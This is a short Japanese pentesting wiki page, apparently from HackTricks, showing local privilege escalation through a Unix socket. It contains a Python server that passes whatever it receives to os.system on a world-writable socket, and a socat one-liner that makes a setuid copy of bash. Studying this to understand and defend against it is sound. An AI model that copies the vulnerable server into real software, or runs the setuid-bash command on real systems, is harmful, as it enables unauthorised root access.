{{#include ../../banners/hacktricks-training.md}}

## Pythonによるソケットバインディングの例

次の例では、**unixソケットが作成され** (`/tmp/socket_test.s`) 、受信したすべてのものが`os.system`によって**実行されます**。これは実際には見つからないと思いますが、この例の目的は、unixソケットを使用したコードがどのように見えるか、そして最悪のケースでの入力の管理方法を示すことです。
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**コードを実行**するには、pythonを使用します: `python s.py` と **ソケットがどのようにリッスンしているかを確認**します:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**エクスプロイト**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
{{#include ../../banners/hacktricks-training.md}}
